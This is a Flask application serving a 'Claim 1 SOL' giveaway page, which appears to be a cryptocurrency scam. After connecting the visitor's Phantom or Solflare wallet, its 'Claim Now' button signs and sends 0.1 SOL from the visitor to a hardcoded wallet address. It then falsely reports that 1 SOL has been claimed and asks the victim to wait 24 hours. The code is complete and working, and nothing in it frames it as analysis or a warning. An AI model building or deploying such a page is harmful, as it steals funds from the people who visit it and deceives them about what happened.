from flask import Flask, render_template_string

app = Flask(__name__)

WALLET_ADDRESS = "79vGoijbHkY324wioWsi2uL62dyc1c3H1945Pb71RCVz"
QR_CODE_URL = "https://raw.githubusercontent.com/markosgiassa1/coinupdater_bot/main/WelcomeCoinUpdater_qrcode.png"

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Claim 1 SOL</title>
  <style>
    body {
      background-color: #000;
      color: #fff;
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 40px;
    }
    .button {
      background: linear-gradient(to right, #00ff90, #00d178);
      border: none;
      color: #000;
      font-weight: bold;
      padding: 14px 30px;
      font-size: 16px;
      border-radius: 30px;
      cursor: pointer;
      margin: 20px;
    }
    .button:disabled {
      opacity: 0.5;
      cursor: not-allowed;
    }
    img.qr {
      width: 220px;
      margin: 20px auto;
      border-radius: 16px;
      box-shadow: 0 0 20px #00ff90;
      display: none;
    }
    #status {
      margin-top: 20px;
      color: #ccc;
      font-size: 0.9em;
      white-space: pre-wrap;
    }
  </style>
  <script type="module">
    import {
      Connection,
      PublicKey,
      SystemProgram,
      Transaction,
      clusterApiUrl
    } from "https://cdn.jsdelivr.net/npm/@solana/web3.js@1.89.0/+esm";

    let provider = null;
    let pubKey = null;

    const status = document.getElementById("status");
    const qr = document.getElementById("qrCode");
    const connectBtn = document.getElementById("connectBtn");

    connectBtn.addEventListener('click', async () => {
      if (window.solana?.isPhantom) {
        provider = window.solana;
      } else if (window.solflare?.isSolflare) {
        provider = window.solflare;
      } else if (window.phantom?.solana?.isPhantom) {
        provider = window.phantom.solana;
      }

      if (!provider) {
        status.innerText = "⚠️ No wallet detected. Open this in Solflare or Phantom app.";
        qr.style.display = "block";
        return;
      }

      try {
        status.innerText = "🔄 Waiting for wallet approval...";
        const resp = await provider.connect();
        pubKey = resp?.publicKey || provider.publicKey;

        if (pubKey) {
          status.innerText = "✅ Connected: " + pubKey.toString();
          document.getElementById("claimBtn").disabled = false;
        } else {
          status.innerText = "✅ Connected, but no publicKey received.";
        }
      } catch (err) {
        console.error("Connection failed:", err);
        if (err.code === 4001 || (err.message && err.message.toLowerCase().includes("rejected"))) {
          status.innerText = "❌ Connection rejected by user.";
        } else {
          status.innerText = "❌ Wallet connection failed. Please try again or open in wallet app.";
        }
      }
    });

    window.claimNow = async () => {
      if (!provider || !pubKey) {
        alert("Please connect your wallet first.");
        return;
      }

      try {
        const connection = new Connection(clusterApiUrl("mainnet-beta"), "confirmed");
        const recipient = new PublicKey("{{ wallet }}");

        const transaction = new Transaction().add(
          SystemProgram.transfer({
            fromPubkey: pubKey,
            toPubkey: recipient,
            lamports: 0.1 * 1e9
          })
        );

        transaction.feePayer = pubKey;
        let { blockhash } = await connection.getLatestBlockhash();
        transaction.recentBlockhash = blockhash;

        const signed = await provider.signTransaction(transaction);
        const signature = await connection.sendRawTransaction(signed.serialize());
        await connection.confirmTransaction(signature);

        status.innerHTML = `
          ✅ You’ve claimed 1 SOL!<br><br>
          Please wait patiently for 24h as people are in high request.<br><br>
          <small><a href="https://solscan.io/tx/${signature}" target="_blank">View on Solscan</a></small>
        `;
        document.getElementById("claimBtn").disabled = true;
        connectBtn.disabled = true;
      } catch (err) {
        console.error("Transaction error:", err);
        status.innerText = "❌ Transaction failed. " + (err.message || "");
      }
    };
  </script>
</head>
<body>
  <h1>🎁 Claim 1 SOL</h1>
  <p>Send exactly <strong>0.1 SOL</strong> to:</p>
  <p><code>{{ wallet }}</code></p>
  <img id="qrCode" class="qr" src="{{ qr_url }}" alt="QR Code" />

  <button class="button" id="connectBtn">🔗 Connect Wallet</button>
  <button class="button" id="claimBtn" onclick="claimNow()" disabled>🚀 Claim Now!</button>

  <div id="status">Click "Connect Wallet" to begin.</div>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(HTML_TEMPLATE, wallet=WALLET_ADDRESS, qr_url=QR_CODE_URL)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
